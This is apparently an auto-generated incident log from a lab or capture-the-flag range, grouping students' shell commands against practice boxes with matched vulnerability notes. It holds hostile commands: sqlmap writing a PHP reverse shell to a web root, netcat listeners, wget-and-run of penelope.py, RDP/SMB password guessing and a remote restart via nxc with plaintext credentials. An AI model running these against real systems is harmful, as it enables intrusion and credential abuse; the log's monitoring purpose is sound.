  - 2026-02-03T19:28:25 | logs/10.100.7.12/shell_history.csv#L250 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 258 - 2026-02-03T19:29:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:29:06 | logs/10.100.7.11/shell_history.csv#L269 | nc -lvnp 4445
  - 2026-02-03T19:29:28 | logs/10.100.7.32/shell_history.csv#L946 | ls
  - 2026-02-03T19:29:39 | logs/10.100.7.32/shell_history.csv#L947 | wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
  - 2026-02-03T19:29:40 | logs/10.100.7.32/shell_history.csv#L948 | ls

## Incident 259 - 2026-02-09T12:44:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-02-09T12:44:15 | logs/10.100.7.11/shell_history.csv#L270 | ssh solaris@10.100.7.40
  - 2026-02-09T12:44:15 | logs/10.100.7.11/shell_history.csv#L271 | ssh solaris@10.100.7.40
  - 2026-02-09T12:44:15 | logs/10.100.7.11/shell_history.csv#L272 | ssh solaris@10.100.7.40

## Incident 260 - 2026-02-09T18:13:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-02-09T18:13:31 | logs/10.100.7.11/shell_history.csv#L274 | ssh solaris@10.100.7.40
  - 2026-02-09T18:13:44 | logs/10.100.7.11/shell_history.csv#L275 | ssh solaris@10.100.7.40

## Incident 261 - 2026-02-09T18:13:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-02-09T18:13:38 | logs/10.100.7.14/shell_history.csv#L426 | nmap 10.100.7.41
  - 2026-02-09T18:13:45 | logs/10.100.7.14/shell_history.csv#L427 | nxc smb 10.100.7.41

## Incident 262 - 2026-02-09T18:14:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-02-09T18:14:04 | logs/10.100.7.11/shell_history.csv#L276 | ssh solaris@10.100.7.40
  - 2026-02-09T18:14:11 | logs/10.100.7.11/shell_history.csv#L277 | ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '10.100.7.40




'
  - 2026-02-09T18:14:17 | logs/10.100.7.11/shell_history.csv#L278 | ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '10.100.7.40'

## Incident 263 - 2026-02-09T18:14:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-09T18:14:22 | logs/10.100.7.32/shell_history.csv#L1016 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-09T18:14:32 | logs/10.100.7.32/shell_history.csv#L1017 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=./php-reverse-shell.php --file-dest=/var/www/html/rev-shell.php"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 264 - 2026-02-09T18:14:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:14:39 | logs/10.100.7.32/shell_history.csv#L1018 | exit
  - 2026-02-09T18:14:39 | logs/10.100.7.32/shell_history.csv#L1019 | ls
  - 2026-02-09T18:14:43 | logs/10.100.7.32/shell_history.csv#L1020 | history
  - 2026-02-09T18:14:48 | logs/10.100.7.32/shell_history.csv#L1021 | history
  - 2026-02-09T18:14:49 | logs/10.100.7.32/shell_history.csv#L1022 | cd /tmp

## Incident 265 - 2026-02-09T18:14:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-02-09T18:14:22 | logs/10.100.7.14/shell_history.csv#L428 | nxc smb 10.100.7.41 -u guest -p ' '
  - 2026-02-09T18:14:31 | logs/10.100.7.14/shell_history.csv#L429 | nxc smb 10.100.7.41 -users
  - 2026-02-09T18:14:39 | logs/10.100.7.14/shell_history.csv#L430 | nxc smb 10.100.7.41 --users

## Incident 266 - 2026-02-09T18:15:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T18:15:06 | logs/10.100.7.14/shell_history.csv#L432 | nxc smb 10.100.7.42
  - 2026-02-09T18:15:12 | logs/10.100.7.14/shell_history.csv#L433 | nxc smb 10.100.7.42 --users
  - 2026-02-09T18:15:38 | logs/10.100.7.14/shell_history.csv#L434 | nxc smb 10.100.7.42 -u guest -p ' '
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 267 - 2026-02-09T18:25:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:25:02 | logs/10.100.7.11/shell_history.csv#L281 | nc -lvnp 4445
  - 2026-02-09T18:25:07 | logs/10.100.7.32/shell_history.csv#L1038 | ls

## Incident 268 - 2026-02-09T18:25:00
- Target IP: 10.100.7.47
- Target Box: crucible
- Entries:
  - 2026-02-09T18:25:00 | logs/10.100.7.14/shell_history.csv#L451 | gobuster dir -u http://10.100.7.47 -w /usr/share/dirb/wordlists/common.txt
  - 2026-02-09T18:25:28 | logs/10.100.7.14/shell_history.csv#L452 | gobuster dir -u http://10.100.7.47:8000 -w /usr/share/dirb/wordlists/common.txt

## Incident 269 - 2026-02-09T18:48:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:48:52 | logs/10.100.7.11/shell_history.csv#L284 | nc -lvnp 4445
  - 2026-02-09T18:48:53 | logs/10.100.7.11/shell_history.csv#L285 | ls
  - 2026-02-09T18:48:06 | logs/10.100.7.14/shell_history.csv#L467 | public
  - 2026-02-09T18:48:12 | logs/10.100.7.14/shell_history.csv#L468 | public

## Incident 270 - 2026-02-09T18:48:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T18:48:32 | logs/10.100.7.14/shell_history.csv#L469 | msbmap -H 10.100.7.42
  - 2026-02-09T18:48:40 | logs/10.100.7.14/shell_history.csv#L470 | smbmap -H 10.100.7.42
  - 2026-02-09T18:48:52 | logs/10.100.7.14/shell_history.csv#L471 | nmap 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 271 - 2026-02-09T18:50:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T18:50:27 | logs/10.100.7.14/shell_history.csv#L473 | evil-winrm -i 10.100.7.42 -u guest -p ' '
  - 2026-02-09T18:50:43 | logs/10.100.7.14/shell_history.csv#L474 | enum4linux-A 10.100.7.42
  - 2026-02-09T18:50:52 | logs/10.100.7.14/shell_history.csv#L475 | enum4linux -A 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 272 - 2026-02-09T19:06:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:06:30 | logs/10.100.7.11/shell_history.csv#L290 | nc -lvnp 4444
  - 2026-02-09T19:06:27 | logs/10.100.7.32/shell_history.csv#L1055 | cd /tmp
  - 2026-02-09T19:06:27 | logs/10.100.7.32/shell_history.csv#L1056 | ls

## Incident 273 - 2026-02-09T19:15:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T19:15:06 | logs/10.100.7.14/shell_history.csv#L502 | xfreerdp3 /v:10.100.7.42 /u:Administrator /p:#330a
  - 2026-02-09T19:15:21 | logs/10.100.7.14/shell_history.csv#L503 | xfreerdp3 /v:10.100.7.42 /u:Administrator /p:#330a0a
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 274 - 2026-02-09T19:17:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:17:28 | logs/10.100.7.11/shell_history.csv#L293 | nc -lvnp 4445
  - 2026-02-09T19:17:40 | logs/10.100.7.11/shell_history.csv#L294 | nc -lvnp 4445

## Incident 275 - 2026-02-09T19:17:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T19:17:08 | logs/10.100.7.14/shell_history.csv#L506 | xfreerdp3 /v:10.100.7.42 /u:Administrator /p:qwerty
  - 2026-02-09T19:17:22 | logs/10.100.7.14/shell_history.csv#L507 | xfreerdp3 /v:10.100.7.42 /u:Administrator /p:abc123
  - 2026-02-09T19:17:42 | logs/10.100.7.14/shell_history.csv#L508 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:abc123
  - 2026-02-09T19:17:59 | logs/10.100.7.14/shell_history.csv#L509 | xfreerdp3 /v:10.100.7.42 /u:orbital /psecurepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 276 - 2026-02-09T19:18:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:18:05 | logs/10.100.7.11/shell_history.csv#L295 | nc -lvnp 4444
  - 2026-02-09T19:18:48 | logs/10.100.7.11/shell_history.csv#L297 | exit

## Incident 277 - 2026-02-09T19:28:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T19:28:06 | logs/10.100.7.11/shell_history.csv#L302 | evil-winrm -i 10.100.7.48
  - 2026-02-09T19:28:34 | logs/10.100.7.11/shell_history.csv#L303 | evil-winrm -i 10.100.7.48 -u guest
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 278 - 2026-02-09T19:28:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:28:12 | logs/10.100.7.32/shell_history.csv#L1062 | exit
  - 2026-02-09T19:28:51 | logs/10.100.7.32/shell_history.csv#L1065 | tldr nc

## Incident 279 - 2026-02-09T19:28:00
- Target IP: 10.100.7.47
- Target Box: crucible
- Entries:
  - 2026-02-09T19:28:15 | logs/10.100.7.32/shell_history.csv#L1063 | nmap 10.100.7.47
  - 2026-02-09T19:28:50 | logs/10.100.7.32/shell_history.csv#L1064 | nmap 10.100.7.47

## Incident 280 - 2026-02-09T19:31:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T19:31:27 | logs/10.100.7.11/shell_history.csv#L305 | xfreerdp3 /u:guest /p:'' /v:10.100.7.48
  - 2026-02-09T19:31:54 | logs/10.100.7.11/shell_history.csv#L306 | enum4linux -a 10.100.7.48
  - 2026-02-09T19:31:58 | logs/10.100.7.12/shell_history.csv#L323 | sqlmap -u 10.100.7.48/api.php?action=filter&region=north""
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 281 - 2026-02-09T19:33:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T19:33:15 | logs/10.100.7.11/shell_history.csv#L307 | ssh guest@10.100.7.48
  - 2026-02-09T19:33:08 | logs/10.100.7.12/shell_history.csv#L325 | sqlmap -u 10.100.7.48/api.php?action=filter&region=north&source=solar""
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 282 - 2026-02-10T19:20:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:20:15 | logs/10.100.7.11/shell_history.csv#L312 | nmap -sV -p 1-65535 -T3 10.100.7.48
  - 2026-02-10T19:20:15 | logs/10.100.7.11/shell_history.csv#L313 | nmap -sV -p 1-65535 -T3 10.100.7.48
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 283 - 2026-02-10T19:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:20:23 | logs/10.100.7.32/shell_history.csv#L1087 | exit
  - 2026-02-10T19:20:54 | logs/10.100.7.32/shell_history.csv#L1089 | ls
  - 2026-02-10T19:20:57 | logs/10.100.7.32/shell_history.csv#L1090 | vi main.c

## Incident 284 - 2026-02-10T19:21:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:21:17 | logs/10.100.7.34/shell_history.csv#L79 | nmap -sC -sV -p 22,80 10.100.7.48
  - 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L80 | nmap -sC -sV -p 22,80 10.100.7.48
  - 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L81 | nmap -sC -sV -p 22,80 10.100.7.48
  - 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L82 | nmap -sC -sV -p 22,80 10.100.7.48
  - 2026-02-10T19:21:58 | logs/10.100.7.34/shell_history.csv#L83 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-10T19:21:49 | logs/10.100.7.14/shell_history.csv#L564 | mysql -h 10.100.7.48 -P 3306 -u inspire
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 285 - 2026-02-10T19:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:21:02 | logs/10.100.7.32/shell_history.csv#L1091 | vi crucible_chatbot.c
  - 2026-02-10T19:21:22 | logs/10.100.7.32/shell_history.csv#L1092 | exit
  - 2026-02-10T19:21:23 | logs/10.100.7.32/shell_history.csv#L1093 | ls
  - 2026-02-10T19:21:24 | logs/10.100.7.32/shell_history.csv#L1094 | cat crucible_chatbot.c

## Incident 286 - 2026-02-10T19:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:23:08 | logs/10.100.7.11/shell_history.csv#L315 | exit
  - 2026-02-10T19:23:29 | logs/10.100.7.11/shell_history.csv#L316 | tldr evil-winrm

## Incident 287 - 2026-02-10T19:24:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:24:28 | logs/10.100.7.11/shell_history.csv#L317 | evil-winrm -i 10.100.7.42 -u guest
  - 2026-02-10T19:24:28 | logs/10.100.7.11/shell_history.csv#L318 | evil-winrm -i 10.100.7.42 -u guest
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 288 - 2026-02-10T19:25:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:25:02 | logs/10.100.7.34/shell_history.csv#L86 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:03 | logs/10.100.7.34/shell_history.csv#L87 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:03 | logs/10.100.7.34/shell_history.csv#L88 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:03 | logs/10.100.7.34/shell_history.csv#L89 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:03 | logs/10.100.7.34/shell_history.csv#L90 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:03 | logs/10.100.7.34/shell_history.csv#L91 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:03 | logs/10.100.7.34/shell_history.csv#L92 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:04 | logs/10.100.7.34/shell_history.csv#L93 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:04 | logs/10.100.7.34/shell_history.csv#L94 | mysql -h 10.100.7.48 -u root -\n
  - 2026-02-10T19:25:09 | logs/10.100.7.34/shell_history.csv#L95 | mysql -h 10.100.7.48 -u root
  - 2026-02-10T19:25:28 | logs/10.100.7.34/shell_history.csv#L96 | mysql -h 10.100.7.48 -u root -p
  - 2026-02-10T19:25:38 | logs/10.100.7.34/shell_history.csv#L97 | mysql -h 10.100.7.48 -u root -p
  - 2026-02-10T19:25:38 | logs/10.100.7.34/shell_history.csv#L98 | mysql -h 10.100.7.48 -u root -p
  - 2026-02-10T19:25:39 | logs/10.100.7.34/shell_history.csv#L99 | mysql -h 10.100.7.48 -u root -p
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 289 - 2026-02-10T19:33:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:33:48 | logs/10.100.7.11/shell_history.csv#L320 | mssql
  - 2026-02-10T19:33:56 | logs/10.100.7.14/shell_history.csv#L578 | mssql.py
  - 2026-02-10T19:33:59 | logs/10.100.7.14/shell_history.csv#L579 | mssql

## Incident 290 - 2026-02-10T19:43:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:43:06 | logs/10.100.7.14/shell_history.csv#L587 | mysql -h 10.100.7.48 -u inspire
  - 2026-02-10T19:43:21 | logs/10.100.7.14/shell_history.csv#L588 | mysql -h 10.100.7.48 -u inspire
  - 2026-02-10T19:43:21 | logs/10.100.7.14/shell_history.csv#L589 | └─$ mysql -h 10.100.7.48
  - 2026-02-10T19:43:22 | logs/10.100.7.14/shell_history.csv#L593 | └─$ mysql -h 10.100.7.48 -u inspire
  - 2026-02-10T19:43:23 | logs/10.100.7.14/shell_history.csv#L597 | └─$ mysql -h 10.100.7.48 -u inspire
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 291 - 2026-02-10T19:43:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:43:21 | logs/10.100.7.14/shell_history.csv#L590 | ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
  - 2026-02-10T19:43:21 | logs/10.100.7.14/shell_history.csv#L591 | ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
  - 2026-02-10T19:43:22 | logs/10.100.7.14/shell_history.csv#L592 | ┌──(kali㉿kali-group1-04)-[~]
  - 2026-02-10T19:43:22 | logs/10.100.7.14/shell_history.csv#L594 | ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
  - 2026-02-10T19:43:22 | logs/10.100.7.14/shell_history.csv#L595 | ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
  - 2026-02-10T19:43:22 | logs/10.100.7.14/shell_history.csv#L596 | ┌──(kali㉿kali-group1-04)-[~]
  - 2026-02-10T19:43:23 | logs/10.100.7.14/shell_history.csv#L598 | ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
  - 2026-02-10T19:43:23 | logs/10.100.7.14/shell_history.csv#L599 | ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
  - 2026-02-10T19:43:23 | logs/10.100.7.14/shell_history.csv#L600 | ┌──(kali㉿kali-group1-04)-[~]
  - 2026-02-10T19:43:23 | logs/10.100.7.14/shell_history.csv#L601 | └─$

## Incident 292 - 2026-02-10T19:46:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:46:29 | logs/10.100.7.11/shell_history.csv#L324 | ssh sa@10.100.7.42
  - 2026-02-10T19:46:44 | logs/10.100.7.11/shell_history.csv#L325 | ssh sa@10.100.7.42:1433
  - 2026-02-10T19:46:57 | logs/10.100.7.11/shell_history.csv#L326 | ssh -p 1433 sa@10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 293 - 2026-02-10T19:48:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:48:08 | logs/10.100.7.11/shell_history.csv#L328 | mssqlclient.py sa@10.100.7.42 -p 1433
# When prompted for password, just hit Enter
  - 2026-02-10T19:48:33 | logs/10.100.7.11/shell_history.csv#L329 | mssqlclient.py sa@10.100.7.42 -p 1433
  - 2026-02-10T19:48:39 | logs/10.100.7.11/shell_history.csv#L330 | impacket-mssqlclient.py sa@10.100.7.42 -p 1433
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 294 - 2026-02-10T19:51:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:51:23 | logs/10.100.7.11/shell_history.csv#L333 | impacket-mssqlclient sa@10.100.7.42 -p 1433
  - 2026-02-10T19:51:58 | logs/10.100.7.11/shell_history.csv#L334 | impacket-mssqlclient Administrator@10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 295 - 2026-02-10T19:52:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:52:05 | logs/10.100.7.11/shell_history.csv#L335 | impacket-mssqlclient Administrator@10.100.7.42
  - 2026-02-10T19:52:35 | logs/10.100.7.11/shell_history.csv#L336 | impacket-mssqlclient orbital@10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 296 - 2026-02-10T19:56:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:56:24 | logs/10.100.7.11/shell_history.csv#L337 | exit
  - 2026-02-10T19:56:46 | logs/10.100.7.14/shell_history.csv#L612 | sqlcmd

## Incident 297 - 2026-02-10T19:56:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:56:27 | logs/10.100.7.34/shell_history.csv#L113 | enum4linux -a 10.100.7.42
  - 2026-02-10T19:56:40 | logs/10.100.7.34/shell_history.csv#L114 | nmap --script smb-enum-shares,smb-enum-users -p445 10.100.7.42
  - 2026-02-10T19:56:13 | logs/10.100.7.14/shell_history.csv#L611 | sqlcmd -S tcp:10.100.7.42,1433
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 298 - 2026-02-10T19:58:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:58:32 | logs/10.100.7.11/shell_history.csv#L338 | exit
  - 2026-02-10T19:58:05 | logs/10.100.7.12/shell_history.csv#L345 | ls
  - 2026-02-10T19:58:08 | logs/10.100.7.12/shell_history.csv#L346 | cd Documents
  - 2026-02-10T19:58:24 | logs/10.100.7.12/shell_history.csv#L347 | nano test.py
  - 2026-02-10T19:58:30 | logs/10.100.7.12/shell_history.csv#L348 | python3 test.py

## Incident 299 - 2026-02-10T19:59:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:59:02 | logs/10.100.7.11/shell_history.csv#L339 | nxc smb 10.100.7.42 -u Administrator
  - 2026-02-10T19:59:28 | logs/10.100.7.11/shell_history.csv#L340 | nxc smb 10.100.7.42 -u Administrator -p 'Canopy@123'
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 300 - 2026-02-10T20:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T20:02:32 | logs/10.100.7.11/shell_history.csv#L342 | penelope
  - 2026-02-10T20:02:47 | logs/10.100.7.11/shell_history.csv#L343 | penelope
  - 2026-02-10T20:02:50 | logs/10.100.7.11/shell_history.csv#L344 | wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
  - 2026-02-10T20:02:51 | logs/10.100.7.11/shell_history.csv#L345 | wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

## Incident 301 - 2026-02-10T20:03:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T20:03:23 | logs/10.100.7.11/shell_history.csv#L346 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-02-10T20:03:53 | logs/10.100.7.11/shell_history.csv#L347 | exit
  - 2026-02-10T20:03:56 | logs/10.100.7.11/shell_history.csv#L348 | exit

## Incident 302 - 2026-02-10T20:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T20:05:17 | logs/10.100.7.11/shell_history.csv#L350 | nc -lvnp 4444
  - 2026-02-10T20:05:18 | logs/10.100.7.11/shell_history.csv#L351 | nc -lvnp 4444
  - 2026-02-10T20:05:18 | logs/10.100.7.11/shell_history.csv#L352 | nc -lvnp 4444
  - 2026-02-10T20:05:18 | logs/10.100.7.11/shell_history.csv#L353 | nc -lvnp 4444

## Incident 303 - 2026-02-10T20:10:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T20:10:47 | logs/10.100.7.11/shell_history.csv#L356 | nxc smb 10.100.7.42 -u orbital -p 'Canopy@123'
  - 2026-02-10T20:10:46 | logs/10.100.7.31/shell_history.csv#L96 | nxc smb 10.100.7.42 -u orbital -p 123 -X Restart-Computer
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 304 - 2026-02-10T20:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T20:22:56 | logs/10.100.7.11/shell_history.csv#L358 | cd Downloads
  - 2026-02-10T20:22:57 | logs/10.100.7.11/shell_history.csv#L359 | ls

## Incident 305 - 2026-05-11T15:10:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-05-11T15:10:03 | logs/10.100.7.11/shell_history.csv#L361 | nc -lvnp 4445
  - 2026-05-11T15:10:05 | logs/10.100.7.11/shell_history.csv#L362 | ls
  - 2026-05-11T15:10:12 | logs/10.100.7.11/shell_history.csv#L363 | ls

## Incident 306 - 2026-01-08T19:28:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:28:12 | logs/10.100.7.33/shell_history.csv#L1 | exit
  - 2026-01-08T19:28:07 | logs/10.100.7.34/shell_history.csv#L1 | exit

## Incident 307 - 2026-01-08T19:29:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:29:36 | logs/10.100.7.33/shell_history.csv#L2 | sudo bash
  - 2026-01-08T19:29:44 | logs/10.100.7.33/shell_history.csv#L3 | sudo bash
  - 2026-01-08T19:29:27 | logs/10.100.7.34/shell_history.csv#L2 | sudo bash
  - 2026-01-08T19:29:46 | logs/10.100.7.34/shell_history.csv#L3 | sudo bash

## Incident 308 - 2026-01-13T19:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:23:09 | logs/10.100.7.33/shell_history.csv#L11 | tldr nxc smb
  - 2026-01-13T19:23:52 | logs/10.100.7.22/shell_history.csv#L71 | vim credentials.txt

## Incident 309 - 2026-01-13T19:25:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:25:19 | logs/10.100.7.33/shell_history.csv#L13 | smbclient //server/share --user solaris
  - 2026-01-13T19:25:36 | logs/10.100.7.33/shell_history.csv#L14 | smbclient //server/share --user solaris
  - 2026-01-13T19:25:07 | logs/10.100.7.14/shell_history.csv#L41 | exit

## Incident 310 - 2026-01-13T19:25:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-13T19:25:32 | logs/10.100.7.14/shell_history.csv#L42 | ssh ubuntu@10.100.7.43
  - 2026-01-13T19:25:58 | logs/10.100.7.14/shell_history.csv#L43 | ssh starfall@10.100.7.43

## Incident 311 - 2026-01-13T19:28:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:28:57 | logs/10.100.7.33/shell_history.csv#L15 | nxc smb 10.100.7.40 -u guest -p credentials.txt
  - 2026-01-13T19:28:00 | logs/10.100.7.32/shell_history.csv#L249 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.40

## Incident 312 - 2026-01-13T19:31:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:31:11 | logs/10.100.7.33/shell_history.csv#L18 | nxc smb 10.100.7.40 -u guest -p /usr/share/wordlist/rockyou.txt
  - 2026-01-13T19:31:00 | logs/10.100.7.32/shell_history.csv#L256 | nxc smb 10.100.7.40 -u guest -p '' --shares

## Incident 313 - 2026-01-13T19:33:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
